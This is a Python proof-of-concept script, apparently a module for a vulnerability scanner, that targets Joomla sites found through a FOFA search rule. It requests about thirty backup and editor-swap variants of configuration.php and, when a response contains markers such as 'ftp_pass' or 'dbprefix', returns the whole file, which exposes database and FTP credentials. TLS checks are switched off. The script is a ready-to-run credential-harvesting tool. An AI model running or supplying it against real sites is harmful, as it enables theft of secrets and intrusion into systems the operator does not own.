#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from Config.config_requests import ua


requests.packages.urllib3.disable_warnings()


# 脚本信息
######################################################
NAME='joomla_config_find'
AUTHOR="Trans"
REMARK='joomla config文件查找'
FOFA_RULE='app="joomla"'
######################################################


def poc(target):
    result = {}
    configlist = ['configuration.php','configuration.php_old','configuration.php_new','configuration.php~','configuration.php.new','configuration.php.new~','configuration.php.old','configuration.php.old~','configuration.bak','configuration.php.bak','configuration.php.bkp','configuration.txt','configuration.php.txt','configuration - Copy.php','configuration.php.swo','configuration.php_bak','configuration.php#','configuration.orig','configuration.php.save','configuration.php.original','configuration.php.swp','configuration.save','.configuration.php.swp','configuration.php1','configuration.php2','configuration.php3','configuration.php4','configuration.php4','configuration.php6','configuration.php7','configuration.phtml','configuration.php-dist']
    for filename in configlist:
        url = target + filename
        headers = {
            "User-Agent":ua,
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Connection": "close"
        }
        res = requests.get(url, headers=headers, timeout=5, verify=False)
        res = res.text
        #print(res)

        if "ftp_pass" in res or "dbtype" in res or "force_ssl" in res or "dbprefix" in res:
            result['message'] = res
            result['target_url'] = url
            return result

if __name__ == '__main__':

    # poc调用
    poc("http://127.0.0.1/")